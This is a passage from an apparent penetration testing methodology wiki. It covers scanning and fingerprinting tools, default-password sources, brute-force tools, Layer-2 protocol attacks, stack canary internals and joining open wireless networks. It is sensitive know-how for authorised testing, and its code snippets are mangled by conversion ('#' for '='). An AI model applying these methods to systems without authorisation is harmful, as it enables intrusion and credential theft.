<p>SVMAP is a part of the SIPVicious suite and it can be used to scan identify and fingerprint a single IP or a range of IP addresses.  Svmap allows specifying the method being used such as OPTIONS, INVITE, and REGISTER.</p>
<p>[[:File:Penetration_Testing_Execution_127.png|Screenshot Here]]</p>
<h4 id="passive-testing">Passive Testing</h4>
<p>Passive Testing is exactly what it sounds like.  Testing for vulnerabilities but doing so in a passive manner.  This is often best left to automated tools, but it can be accomplished by  manually methods as well.</p>
<h5 id="automated-tools_1">Automated Tools</h5>
<h6 id="traffic-monitoring">Traffic Monitoring</h6>
<p>Traffic Monitoring is a passive mechanism for gathering further information about the targets.  This can be helpful in determining the specifics of an operating system or network device.  There are times when active fingerprinting may indicate, for example, an older operating system.  This may or may not be the case.  Passive fingerprinting is essentially a "free" way to ensure that the data you are reporting is as accurate as possible.</p>
<p>'''P0f'''</p>
<p>P0f is an awesome passive fingerprinting tool.  P0f can identify the operating system on based upon machines you connect to and that you connect to as well as machines that you cannot connect to.  Also, it can fingerprint machines based upon the communications that your interfaces can observe.</p>
<p>[[:File:Penetration_Testing_Execution_128.png|Screenshot Here]]</p>
<h5 id="wireshark">Wireshark</h5>
<p>Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education. Originally named Ethereal, in May 2006 the project was renamed Wireshark due to trademark issues.</p>
<p>Wireshark is cross-platform, using the GTK<nowiki>+</nowiki> widget toolkit to implement its user interface, and using pcap to capture packets; it runs on various Unix-like operating systems including Linux, Mac OS X, BSD, and Solaris, and on Microsoft Windows.</p>
<p>[[:File:Penetration_Testing_Execution_129.png|Screenshot Here]]</p>
<h5 id="tcpdump">Tcpdump</h5>
<p>Tcpdump is a common packet analyzer that runs under the command line. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached. Tcpdump works on most Unix-like operating systems: Linux, Solaris, BSD, Mac OS X, HP-UX and AIX among others. In those systems, tcpdump uses the libpcap library to capture packets.</p>
<p>There is also a port of tcpdump for Windows called WinDump; this uses WinPcap, which is a port of libpcap to Windows.</p>
<p>[[:File:Penetration_Testing_Execution_130.png|Screenshot Here]]</p>
<h5 id="metasploit-scanners">Metasploit Scanners</h5>
<h6 id="metasploit-unleashed">Metasploit Unleashed</h6>
<p>The [<a href="http://www.offensive-security.com/metasploit-unleashed/Vulnerability_Scanning">http://www.offensive-security.com/metasploit-unleashed/Vulnerability_Scanning</a> Metasploit Unleashed] course has several tutorials on performing vulnerability scanning leveraging the Metasploit Framework.</p>
<h3 id="vulnerability-validation">Vulnerability Validation</h3>
<h4 id="public-research">Public Research</h4>
<p>A product of the vast amount of security research is the discovery of vulnerabilities and associated Proof of Concept (PoC) and/or exploit code.  The results from the vulnerability identification phase must be individually validated and where exploits are available, these must be validated.  The only exception would be an exploit that results in a Denial of Service (DoS).  This would need to be included in the scope to be considered for validation.  There are numerous sites that offer such code for download that should be used as part of the Vulnerability Analysis phase.</p>
<ul>
<li>Exploit-db - <a href="http://www.exploit-db.com">http://www.exploit-db.com</a></li>
<li>Security Focus -  <a href="http://www.securityfocus.com">http://www.securityfocus.com</a></li>
<li>Packetstorm - <a href="http://www.packetstorm.com">http://www.packetstorm.com</a></li>
<li>Security Reason - <a href="http://www.securityreason.com">http://www.securityreason.com</a></li>
<li>Black Asylum - <a href="http://www.blackasylum.com/?p#160">http://www.blackasylum.com/?p#160</a></li>
</ul>
<h5 id="commondefault-passwords">Common/default passwords</h5>
<p>Attempt to identify if a device, application, or operating system is vulnerable to a default credential attack is really as simple as trying to enter in known default passwords.  Default passwords can be obtained from the following websites:<br>
* <a href="http://www.phenoelit-us.org/dpl/dpl.html">http://www.phenoelit-us.org/dpl/dpl.html</a> 
* <a href="http://cirt.net/passwords">http://cirt.net/passwords</a> 
* <a href="http://www.defaultpassword.com">http://www.defaultpassword.com</a>
* <a href="http://www.passwordsdatabase.com">http://www.passwordsdatabase.com</a>
* <a href="http://www.isdpodcast.com/resources/62k-common-passwords/">http://www.isdpodcast.com/resources/62k-common-passwords/</a></p>
<h4 id="establish-target-list">Establish target list</h4>
<p>Identifying all potential targets is critical to penetration testing.  Properly established target lists ensure that attacks are properly targeted. If the particular versions of software running in the environment can be identified, the tester is dealing with a known quantity, and can even replicate the environment.  A properly defined target list should include a mapping of OS version, patch level information.  If known it should include web application weaknesses, lockout thresholds and weak ports for attack.</p>
<h5 id="mapping-versions">Mapping Versions</h5>
<p>Version checking is a quick way to identify application information. To some extent, versions of services can be fingerprinted using nmap, and versions of web applications can often be gathered by looking at the source of an arbitrary page. </p>
<h5 id="identifying-patch-levels">Identifying Patch Levels</h5>
<p>To identify the patch level of services internally, consider using software which will interrogate the system for differences between versions. Credentials may be used for this phase of the penetration test, provided the client has acquiesced. Vulnerability scanners are particularly effective at identifying patch levels remotely, without credentials. </p>
<h5 id="looking-for-weak-web-applications">Looking for Weak Web Applications</h5>
<p>Identifying weak web applications can be a particularly fruitful activity during a penetration test. Things to look for include OTS applications that have been misconfigured, OTS application which have plugin functionality (plugins often contain more vulnerable code than the base application), and custom applications. Web application fingerprinters such as WAFP can be used here to great effect.</p>
<h5 id="identify-weak-ports-and-services">Identify Weak Ports and Services #####</h5>
<p>Identifying weak ports can be done using banner grabbing, nmap and common sense. Many ports and services will lie, or mislead about the specifics of their version. </p>
<h5 id="identify-lockout-threshold">Identify Lockout threshold</h5>
<p>Identifying the lockout threshold of an authentication service will allow you to ensure that your bruteforce attacks do not intentionally lock out valid users during your testing. Identify all disparate authentication services in the environment, and test a single, innocuous account for lockout. Often 5 - 10 tries of a valid account is enough to determine if the service will lock users out.</p>
<h3 id="attack-avenues">Attack Avenues</h3>
<p>Attack avenues focus on identifying all potential attack vectors that could be leveraged against a target.  This is much more detailed than simply looking at the open or filtered ports, but evaluates the Footprinting information and automated results in an effort to create an attack tree.</p>
<h4 id="creation-of-attack-trees">Creation of Attack Trees</h4>
<p>Attack trees are conceptual diagrams of threats on target systems and should include all possible attack methods to reach those threats.</p>
<h4 id="identify-protection-mechanisms">Identify protection mechanisms</h4>
<p>There is no magic bullet for detecting and subverting Network or Host based protection mechanisms.  It takes skill and experience.  This is beyond the scope of this document, which only lists the relevant protection mechanisms and describes what they do.</p>
<h5 id="network-protections">Network protections</h5>
<h6 id="simple-packet-filters">"Simple" Packet Filters</h6>
<p>Packet filters are rules for classifying packets based on their header fields.  Packet classification is essential to routers supporting services such as quality of service (QoS), virtual private networks (VPNs), and firewalls.</p>
<h6 id="traffic-shaping-devices">Traffic shaping devices</h6>
<p>Traffic shaping is the control of computer network traffic in order to optimize or guarantee performance, improve latency, and/or increase usable bandwidth for some kinds of packets by delaying other kinds of packets that meet certain criteria.  During penetration test traffic shaping can also control the volume of traffic being sent into a network in a specified period, or the maximum rate at which the traffic is sent.  For these reasons; traffic shaping is important to detect at the network edges to avoid packet dropping and packet marking.</p>
<h6 id="data-loss-prevention-dlp-systems">Data Loss Prevention (DLP) systems</h6>
<p>Data Loss Prevention (DLP) refers to systems that identify, monitor, and protect data in use, data in motion, and data at rest via content inspection and contextual analysis of activities (attributes of originator, data object, medium, timing, recipient/destination and so on).  DLP systems are analogous to intrusion-prevention system for data.</p>
<h5 id="host-based-protections">Host based protections</h5>
<p>Host-based protections usually revolve around an installed software package which monitors a single host for suspicious activity by analyzing events occurring within that host.  The majority of Host-based protections utilize one of three detection methods: signature-based, statistical anomaly-based and stateful protocol analysis.</p>
<h6 id="stackheap-protections">Stack/heap protections</h6>
<p>Numerous tools are available that can monitor the host to provide protections against buffer overflows.  Microsoft's Data Execution Prevention mode is an example that is designed to explicitly protect the pointer to the SEH Exception Handler from being overwritten.</p>
<h6 id="whitelisting">Whitelisting</h6>
<p>Whitelisting provides a list of entities that are being provided a particular privilege, service, mobility, access, or recognition.  An emerging approach in combating attacks by viruses and malware is to whitelist software which is considered safe to run, blocking all others</p>
<h6 id="avfilteringbehavioral-analysis">AV/Filtering/Behavioral Analysis</h6>
<p>Behavioral analysis works from a set of rules that define a program as either legitimate, or malicious.  Behavioral analysis technology monitors what an application or piece of code does and attempts to restrict its action.  Examples of this might include applications trying to write to certain parts of a system registry, or writing to pre-defined folders.  These and other actions would be blocked, with the actions notified to the user or administrator.</p>
<h5 id="application-level-protections">Application level protections</h5>
<h2 id="exploitation">Exploitation</h2>
<h3 id="precision-strike">Precision strike</h3>
<p>Additional information on exploitation can be found at the [<a href="http://www.offensive-security.com/metasploit-unleashed/Exploit_Development">http://www.offensive-security.com/metasploit-unleashed/Exploit_Development</a> Metasploit Unleashed] course.</p>
<h4 id="countermeasure-bypass">Countermeasure Bypass</h4>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="av">AV</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span>
* Encoding
* Packing
* Whitelist Bypass
* Process Injection
* Purely Memory Resident</p>
<h5 id="human">Human</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="hips">HIPS</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="dep">DEP</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="aslr">ASLR</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="va-nx-linux">VA <nowiki>+</nowiki> NX (Linux)</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="wx-openbsd">w<nowiki>^</nowiki>x (OpenBSD)</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="waf">WAF</h5>
<p>A WAF (Web application firewall) is a firewall which can be installed in front of (network topology speaking) a web application. The WAF will analyze each request and look for common web attacks such as Cross Site Scripting and SQLinjection. Like most AV scanners, a blacklisting mechanism is often used to find these potentially malicious HTTP requests (often regex). Since these WAFs are using this blacklisting technique, multiple papers exist on bypassing these types of devices.</p>
<h5 id="stack-canaries">Stack Canaries</h5>
<p>In order to understand the use of the Stack Canaries, one needs to understand the fundamental flaw of buffer overflows. A buffer overflow happens when an application fails to properly verify the length of the input received with the length of the buffer in memory to which this data is copied. Due to the way the stack is build, and the way the data is entered on the stack, the input received could be used to overwrite the EIP (extended instruction pointer, this is used by the application to know where the application came from prior to copying the input to the buffer). When an attacker controls the EIP, the execution of the application can be altered in such a way that the attacker has full control of the application. 
A potential fix is by adding a "cookie" or stack canary right after the buffer on the stack. When the application wants to return, the value of the stack canary is verified. If this value has been altered, the program will ignore the EIP and crash therefore making the buffer overflow ineffective. </p>
<p>Every operating system calculates a different cookie. </p>
<h6 id="microsoft-windows">Microsoft Windows</h6>
<p>The cookie in Windows is added by Visual Studio. One of the options when compiling an application is /GS. The option is enabled by default. The cookie is calculated using a few process specific variables. Below is a representative code of how this cookie is calculated.</p>
<p><nowiki>
void generate_security_cookie() {
    int defaultval1 # 0xFFFF0000;
    int defaultval2 # 0xBB40E64E; // Hex value of PI without comma...</p>
<pre><code>int result # 0;
int resultcomp # 0;

FILETIME filetimestruct ;
GetSystemTimeAsFileTime(&amp;filetimestruct);
LARGE_INTEGER perfcounter;
QueryPerformanceCounter(&amp;perfcounter);

int tickc # GetTickCount();
int threadid # GetCurrentThreadId();
int processid # GetCurrentProcessId();

result # result ^ filetimestruct.dwHighDateTime;
result # result ^ filetimestruct.dwLowDateTime;
result # result ^ threadid;
result # result ^ processid;
result # result ^ tickc;
result # result ^ perfcounter.HighPart;
result # result ^ perfcounter.LowPart;

if (result ## defaultval2) {
    printf("Wow, what are they odd of getting the same value as the beginning");
    result # 0xBB40E64E;
} else {
    if (!(result &amp; defaultval1)) {

        int temp # (result | 0x4711) &lt;&lt; 16;
        result |# temp;
    }
}
resultcomp # ~result;
</code></pre>
<p></nowiki></p>
<p>As you can see, some of these values are not hard to figure out. Except for maybe the LowDateTime and the performance counter. An excellent paper has been written concerning this lack of entropy. More information can be found in that paper here ([<a href="http://j00ru.vexillium.org/?p#690">http://j00ru.vexillium.org/?p#690</a> Exploiting the otherwise non-exploitable])</p>
<h6 id="linux_1">Linux</h6>
<p>As in Windows, the somewhat default compiler, gcc, adds the code for the stack canarie. This code can be found in the file libssp/ssp.c</p>
<p><nowiki>
static void <strong>attribute</strong> ((constructor))
__guard_setup (void)
{
  unsigned char *p;
  int fd;</p>
<p>if (__stack_chk_guard !# 0)
    return;</p>
<p>fd # open ("/dev/urandom", O_RDONLY);
  if (fd !# -1)
    {
      ssize_t size # read (fd, &amp;__stack_chk_guard,
                           sizeof (__stack_chk_guard));
      close (fd);
      if (size ## sizeof(__stack_chk_guard) &amp;&amp; __stack_chk_guard !# 0)
        return;
    }</p>
<p>/* If a random generator can't be used, the protector switches the guard
     to the "terminator canary".  */
  p # (unsigned char *) &amp;__stack_chk_guard;
  p[sizeof(__stack_chk_guard)-1] # 255;
  p[sizeof(__stack_chk_guard)-2] # '\n';
  p[0] # 0;
}
</nowiki></p>
<p>It is known that some older versions of gcc do not use the urandom device in order to create a new cookie. They use a preset cookie value (a mix of unprintable characters such as 00 0A 0D and FF). Gcc will compile an application with stack canaries by default.</p>
<p>Problems with the implementation on Linux:
On a linux machine, there are a few different ways of creating a thread. One of them is called fork(). When using fork to create a new thread, the application will "quickly" create a new thread which will reuse the calculated cookie for each new "fork"-ed thread. If a buffer overflow would exist in this forked thread, an attacker could bruteforce the stack canarie. Once again a great article describing this attack can be found here ([<a href="http://www.phrack.org/issues.html?issue#67&amp;id#13">http://www.phrack.org/issues.html?issue#67&amp;id#13</a> Scraps of notes on remote stack overflow exploitation])</p>
<h6 id="mac-os">MAC OS</h6>
<p>Disabled by default. Contribution required.</p>
<h3 id="customized-exploitation">Customized Exploitation</h3>
<h5 id="fuzzing">Fuzzing</h5>
<p>Fuzzing is the process of attempting to discover security vulnerabilities by sending random input to an application.  If the program contains a vulnerability that can leads to an exception, crash or server error (in the case of web apps), it can be determined that a vulnerability has been discovered.  Fuzzers are generally good at finding buffer overflow, DoS, SQL Injection, XSS, and Format String bugs.  Fuzzing falls into two categories: Dumb Fuzzing and Intelligent Fuzzing.</p>
<h5 id="dumb-fuzzing">Dumb Fuzzing</h5>
<p>Dumb Fuzzing usually consists of simple modifications to legitimate data, that is then fed to the target application.  In this case, the fuzzer is very easy to write and the idea is to identify low hanging fruit.  Although not an elegant approach, dumb fuzzing can produce results, especially when a target application has not been previously tested.  FileFuzz is an example of a Dumb Fuzzer.  FileFuzz is a Windows based file format fuzzing tool that was designed to automate the launching of applications and detection of exceptions caused by fuzzed file formats.</p>
<p>[[:File:Penetration_Testing_Execution_131.png|Screenshot Here]]</p>
<h5 id="intelligent-fuzzing">Intelligent Fuzzing</h5>
<p>Intelligent Fuzzers are ones that are generally aware of the protocol or format of the data being tested.  Some protocols require that the fuzzer maintain state information, such as HTTP or SIP.  Other protocols will make use of authentication before a vulnerability is identified.  Apart from providing much more code coverage, intelligent fuzzers tend to cut down the fuzzing time significantly since they avoid sending data that the target application will not understand. Intelligent fuzzers are therefore much more targeted and sometimes they need to be developed by the security researcher.</p>
<h4 id="sniffing">Sniffing</h4>
<p>A packet analyzer is used to intercept and log traffic passing over the network.  It is considered best practice to utilize a sniffer when performing exploitation.  This ensures that all relevant traffic is captured for further analysis.  This is also extremely useful for extracting cleartext passwords.</p>
<h5 id="wireshark_1">Wireshark</h5>
<p>Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education. Originally named Ethereal, in May 2006 the project was renamed Wireshark due to trademark issues.</p>
<p>Wireshark is cross-platform, using the GTK<nowiki>+</nowiki> widget toolkit to implement its user interface, and using pcap to capture packets; it runs on various Unix-like operating systems including Linux, Mac OS X, BSD, and Solaris, and on Microsoft Windows.</p>
<p>[[:File:Penetration_Testing_Execution_132.png|Screenshot Here]]</p>
<h5 id="tcpdump_1">Tcpdump</h5>
<p>Tcpdump is a common packet analyzer that runs under the command line. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached. Tcpdump works on most Unix-like operating systems: Linux, Solaris, BSD, Mac OS X, HP-UX and AIX among others. In those systems, tcpdump uses the libpcap library to capture packets.</p>
<p>There is also a port of tcpdump for Windows called WinDump; this uses WinPcap, which is a port of libpcap to Windows.</p>
<p>[[:File:Penetration_Testing_Execution_133.png|Screenshot Here]]</p>
<h4 id="brute-force">Brute-Force</h4>
<p>A brute force attack is a strategy that can in theory be used by an attacker who is unable to take advantage of any weakness in a system.  It involves systematically checking all possible usernames and passwords until the correct one is found.</p>
<h5 id="brutus-windows">Brutus (Windows)</h5>
<p>Brutus is a generic password guessing tool that comes with built-in routines for attacking</p>
<p>HTTP Basic and Forms-based authentication, among other protocols like SMTP and</p>
<p>POP3.  Brutus can perform both ''dictionary ''and randomly generated attacks from a given character set.</p>
<p>[[:File:Penetration_Testing_Execution_134.png|Screenshot Here]]</p>
<h5 id="web-brute-windows">Web Brute (Windows)</h5>
<p>Web Brute is included with HP WebInspect and is the primary means of attacking a login form or authentication page, using prepared lists of user names and passwords.</p>
<p>[[:File:Penetration_Testing_Execution_135.png|Screenshot Here]]</p>
<h5 id="thc-hydraxhydra">THC-Hydra/XHydra</h5>
<p>THC-Hydra (or just Hydra) is a network logon bruteforcer which supports attacking many different services such as FTP, HTTP, HTTPS, ICQ, IRC, IMAP, LDAP, MS-SQL, MySQL, NCP, NNTP, Oracle, POP3, pcAnywhere, PostgreSQL, REXEC, RDP, RLOGIN, RSH, SAP R/3, SIP, SMB, SMTP, SNMP, SOCKS, SSH, Subversion (SVN), TeamSpeak, Telnet, VNC, VMware Auth Daemon, and XMPP.  It is available in both a command line and GUI version.</p>
<p>[[:File:Penetration_Testing_Execution_136.png|Screenshot Here]]</p>
<p>[[:File:Penetration_Testing_Execution_137.png|Screenshot Here]]</p>
<h5 id="medusa">Medusa</h5>
<p>Medus is another network logon bruteforcer which supports attacking many different services such as AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP, NNTP, Oracle, POP3, pcAnywhere, PostgreSQL, REXEC, RDP, RLOGIN, RSH, SMB, SMTP, SNMP, SOCKS, SSH, Subversion (SVN), Telnet, VNC, and VMware Auth Daemon.  It is only available in a command line version.</p>
<p>[[:File:Penetration_Testing_Execution_138.png|Screenshot Here]]</p>
<h5 id="ncrack">Ncrack</h5>
<p>Ncrack is another network logon bruteforcer which supports attacking many different services such as RDP, SSH, http(s), SMB, pop3(s), FTP, and telnet.  Ncrack was designed using a modular approach, a command-line syntax similar to Nmap and a dynamic engine that can adapt its behavior based on network feedback.</p>
<p>[[:File:Penetration_Testing_Execution_139.png|Screenshot Here]]</p>
<h4 id="routing-protocols">Routing protocols</h4>
<p>Routing protocols specify how routers communicate with each other, disseminating information that enables them to select routes between any two nodes on a computer network, the choice of the route being done by routing algorithms.  Each router has a priori knowledge only of networks attached to it directly.  A routing protocol shares this information first among immediate neighbors, and then throughout the network.  This way, routers gain knowledge of the topology of the network.</p>
<h4 id="cisco-discovery-protocol-cdp">Cisco Discovery Protocol (CDP)</h4>
<p>The Cisco Discovery Protocol (CDP) is a proprietary Data Link Layer network protocol developed by Cisco Systems that is implemented in most Cisco networking equipment.  It is used to share information about other directly connected Cisco equipment, such as the operating system version and IP address.  CDP can also be used for On-Demand Routing, which is a method of including routing information in CDP announcements so that dynamic routing protocols do not need to be used in simple networks.</p>
<p>Cisco devices send CDP announcements to the multicast destination address 01:00:0C:CC:CC:CC, out each connected network interface.  These multicast packets may be received by Cisco switches and other networking devices that support CDP into their connected network interface.  This multicast destination is also used in other Cisco protocols such as VTP.  By default, CDP announcements are sent every 60 seconds on interfaces that support Subnetwork Access Protocol (SNAP) headers, including Ethernet, Frame Relay, and Asynchronous Transfer Mode (ATM).  Each Cisco device that supports CDP stores the information received from other devices in a table that can be viewed using the show cdp neighbors command.  This table is also accessible via snmp.  The CDP table information is refreshed each time an announcement is received, and the holdtime for that entry is reinitialized.  The holdtime specifies the lifetime of an entry in the table - if no announcements are received from a device for a period in excess of the holdtime, the device information is discarded (default 180 seconds).</p>
<p>The information contained in CDP announcements varies by the type of device and the version of the operating system running on it. This information may include the operating system version, hostname, every address (i.e. IP address) from all protocol(s) configured on the port where CDP frame is sent, the port identifier from which the announcement was sent, device type and model, duplex setting, VTP domain, native VLAN, power draw (for Power over Ethernet devices), and other device specific information.  The details contained in these announcements are easily extended due to the use of the type-length-value (TLV) frame format.  The tool for attacking CDP is Yersinia.</p>
<p>[[:File:Penetration_Testing_Execution_140.png|Screenshot Here]]</p>
<h4 id="hot-standby-router-protocol-hsrp">Hot Standby Router Protocol (HSRP)</h4>
<p>Hot Standby Router Protocol (HSRP) is a Cisco proprietary redundancy protocol for establishing a fault-tolerant default gateway, and has been described in detail in RFC 2281.  The Virtual Router Redundancy Protocol (VRRP) is a standards-based alternative to HSRP defined in IETF standard RFC 3768.  The two technologies are similar in concept, but not compatible.</p>
<p>The protocol establishes a framework between network routers in order to achieve default gateway failover if the primary gateway should become inaccessible, in close association with a rapid-converging routing protocol like EIGRP or OSPF.  By multicasting packets, HSRP sends its hello messages to the multicast address 224.0.0.2 (all routers) using UDP port 1985, to other HSRP-enabled routers, defining priority between the routers.  The primary router with the highest configured priority will act as a virtual router with a pre-defined gateway IP address and will respond to the ARP request from machines connected to the LAN with the MAC address 0000.0c07.acXX where XX is the group ID in hex.  If the primary router should fail, the router with the next-highest priority would take over the gateway IP address and answer ARP requests with the same mac address, thus achieving transparent default gateway fail-over.  A HSRP Basics Simulation visualizes Active/Standby election and link failover with Hello, Coup, ARP Reply packets, and timers.</p>
<p>HSRP and VRRP are not routing protocols as they do not advertise IP routes or affect the routing table in any way.</p>
<p>HSRP and VRRP on some routers have the ability to trigger a failover if one or more interfaces on the router go down.  This can be useful for dual branch routers each with a single serial link back to the head end.  If the serial link of the primary router goes down, you would want the backup router to take over the primary functionality and thus retain connectivity to the head end.  The tool for attacking HSRP is Yersinia.</p>
<p>[[:File:Penetration_Testing_Execution_141.png|Screenshot Here]]</p>
<h4 id="virtual-switch-redundancy-protocol-vsrp">Virtual Switch Redundancy Protocol (VSRP)</h4>
<p>The Virtual Switch Redundancy Protocol (VSRP) is a proprietary network resilience protocol developed by Foundry Networks and currently being sold in products manufactured by both Foundry and Hewlett Packard.  The protocol differs from many others in use as it combines Layer 2 and Layer 3 resilience - effectively doing the jobs of both Spanning tree protocol and the Virtual Router Redundancy Protocol at the same time.  Whilst the restrictions on the physical topologies able to make use of VSRP mean that it is less flexible than STP and VRRP it does significantly improve on the failover times provided by either of those protocols.</p>
<h4 id="dynamic-trunking-protocol-dtp">Dynamic Trunking Protocol (DTP)</h4>
<p>The Dynamic Trunking Protocol (DTP) is a proprietary networking protocol developed by Cisco Systems for the purpose of negotiating trunking on a link between two VLAN-aware switches, and for negotiating the type of trunking encapsulation to be used.  It works on the Layer 2 of the OSI model.  VLAN trunks formed using DTP may utilize either IEEE 802.1Q or Cisco ISL trunking protocols.</p>
<p>DTP should not be confused with VTP, as they serve different purposes.  VTP communicates VLAN existence information between switches.  DTP aids with trunk port establishment.  Neither protocol transmits the data frames that trunks carry.  The tool for attacking DTP is Yersinia.</p>
<p>[[:File:Penetration_Testing_Execution_142.png|Screenshot Here]]</p>
<h4 id="spanning-tree-protocol-stp">Spanning Tree Protocol (STP)</h4>
<p>The Spanning Tree Protocol (STP) is a network protocol that ensures a loop-free topology for any bridged Ethernet local area network.  The basic function of STP is to prevent bridge loops and ensuing broadcast radiation.  Spanning tree also allows a network design to include spare (redundant) links to provide automatic backup paths if an active link fails, without the danger of bridge loops, or the need for manual enabling/disabling of these backup links.</p>
<p>STP is a Data Link Layer protocol.  It is standardized as IEEE 802.1D.  As the name suggests, it creates a spanning tree within a mesh network of connected layer-2 bridges (typically Ethernet switches), and disables those links that are not part of the spanning tree, leaving a single active path between any two network nodes.  The tool for attacking STP is Yersinia.</p>
<p>[[:File:Penetration_Testing_Execution_143.png|Screenshot Here]]</p>
<h4 id="open-shortest-path-first-ospf">Open Shortest Path First (OSPF)</h4>
<p>Open Shortest Path First (OSPF) is an adaptive routing protocol for Internet Protocol (IP) networks.  It uses a link state routing algorithm and falls into the group of interior routing protocols, operating within a single autonomous system (AS).  It is defined as OSPF Version 2 in RFC 2328 (1998) for IPv4.  The updates for IPv6 are specified as OSPF Version 3 in RFC 5340 (2008).</p>
<h4 id="rip">RIP</h4>
<p>RIP is a dynamic routing protocol used in local and wide area networks.  As such it is classified as an interior gateway protocol (IGP).  It uses the distance-vector routing algorithm.  It was first defined in RFC 1058 (1988).  The protocol has since been extended several times, resulting in RIP Version 2 (RFC 2453).  Both versions are still in use today, although they are considered to have been made technically obsolete by more advanced techniques such as Open Shortest Path First (OSPF) and the OSI protocol IS-IS.  RIP has also been adapted for use in IPv6 networks, a standard known as RIPng (RIP next generation) protocol, published in RFC 2080 (1997).</p>
<h4 id="vlan-hopping">VLAN Hopping</h4>
<p>VLAN hopping (virtual local area network hopping) is a computer security exploit, a method of attacking networked file_suport on a VLAN.  The basic concept behind all VLAN hopping attacks is for an attacking host on a VLAN to gain access to traffic on other VLANs that would normally not be accessible.  There are two primary methods of VLAN hopping: switch spoofing and double tagging.</p>
<p>In a switch spoofing attack, an attacking host that is capable of speaking the tagging and trunking protocols used in maintaining a VLAN imitates a trunking switch.  Traffic for multiple VLANs is then accessible to the attacking host.</p>
<p>In a double tagging attack, an attacking host prepends two VLAN tags to packets that it transmits.  The first header (which corresponds to the VLAN that the attacker is really a member of) is stripped off by a first switch the packet encounters, and the packet is then forwarded.  The second, false, header is then visible to the second switch that the packet encounters.  This false VLAN header indicates that the packet is destined for a host on a second, target VLAN.  The packet is then sent to the target host as though it were layer 2 traffic.  By this method, the attacking host can bypass layer 3 security measures that are used to logically isolate hosts from one another.  The tool for attacking 802.1q is Yersinia.</p>
<p>[[:File:Penetration_Testing_Execution_144.png|Screenshot Here]]</p>
<h4 id="vlan-trunking-protocol-vtp">VLAN Trunking Protocol (VTP)</h4>
<p>VLAN Trunking Protocol (VTP) is a Cisco proprietary Layer 2 messaging protocol that manages the addition, deletion, and renaming of Virtual Local Area Networks (VLAN) on a network-wide basis.  Cisco's VLAN Trunk Protocol reduces administration in a switched network.  When a new VLAN is configured on one VTP server, the VLAN is distributed through all switches in the domain.  This reduces the need to configure the same VLAN everywhere.  To do this, VTP carries VLAN information to all the switches in a VTP domain.  VTP advertisements can be sent over ISL, 802.1q, IEEE 802.10 and LANE trunks.  VTP is available on most of the Cisco Catalyst Family products.  The tool for attacking VTP is Yersinia.</p>
<p>[[:File:Penetration_Testing_Execution_145.png|Screenshot Here]]</p>
<h3 id="rf-access">RF Access</h3>
<p>The goal of the earlier phases is to gather every possible piece of information about the Radio Frequencies in use that can be leveraged during this phase.</p>
<h4 id="unencrypted-wireless-lan">Unencrypted Wireless LAN</h4>
<p>It is possible to actually connect to an unencrypted Wireless LAN (WLAN).  To connect to an unencrypted WLAN, you simply have to either issue appropriate commands or use a GUI interface to connect.</p>
<h5 id="iwconfig-linux">Iwconfig (Linux)</h5>
<p>The following commands to connect up to the ESSID.  To ensure that the wireless interface is down, issue the following: <br>
<pre>ifconfig <nowiki>&lt;</nowiki>interface<nowiki>&gt;</nowiki> down</pre>
Force dhclient to release any currently assigned DHCP addresses with the following command:<br>
<pre>dhclient -r <nowiki>&lt;</nowiki>interface<nowiki>&gt;</nowiki></pre>
Bring the interface back up with the following command:<br>
<pre>ifconfig <nowiki>&lt;</nowiki>interface<nowiki>&gt;</nowiki> up</pre>
Iwconfig is similar to ifconfig, but is dedicated to the wireless interfaces.  It is used to set the parameters of the network interface which are specific to the wireless operation.  To assign set the ESSID (or Network Name to the wireless interface, use the following command:</p>
<pre>iwconfig <nowiki><</nowiki>interface<nowiki>></nowiki> essid "ESSID_IN_QUOTES"</pre>

<p>Next we need to set the operating mode of the device, which depends on the network topology.  Setting this to ''Managed'' means that we are connecting to a network that is composed of access points.</p>
<pre>iwconfig <nowiki><</nowiki>interface<nowiki>></nowiki> mode Managed</pre>

<p>Use dhclient to obtain a DHCP addresses with the following command:</p>
<pre>dhclient <nowiki><</nowiki>interface<nowiki>></nowiki></pre>

<p>At this point we should receive an IP address and be connected to the client's wireless network.  Ensure that adequate screen shots are taken to definitively indicate the ability to connect, receive an IP address, and traverse the network.</p>
<h5 id="windows-xp7_1">Windows (XP/7)</h5>
<p>Based upon the wireless network adapter installed, Windows will provide you with a mechanism to connect to wireless networks.  The version of Windows utilized will dictate the process.  For this reason we are covering Windows XP and 7.</p>
<p>[[:File:Penetration_Testing_Execution_146.png|Screenshot Here]]</p>
<p>Windows XP will show an icon with a notification that says it has found wireless networks.</p>
<p>[[:File:Penetration_Testing_Execution_147.png|Screenshot Here]]</p>
<p>Right-click the wireless network icon in the lower right corner of your screen, and then click "View Available Wireless Networks."</p>
<p>[[:File:Penetration_Testing_Execution_148.png|Screenshot Here]]</p>
<p>The Wireless Network Connection window appears and displays your wireless network listed with the SSID you chose.  If you don't see your network, click Refresh network list in the upper left corner.  Click your network, and then click Connect in the lower right corner.</p>
<p>Windows 7 offers the same ability to connect to wireless networks.  On the right side of the taskbar, you will see a wireless network icon like the one below.  Click on it.</p>
<p>[[:File:Penetration_Testing_Execution_149.png|Screenshot Here]]</p>
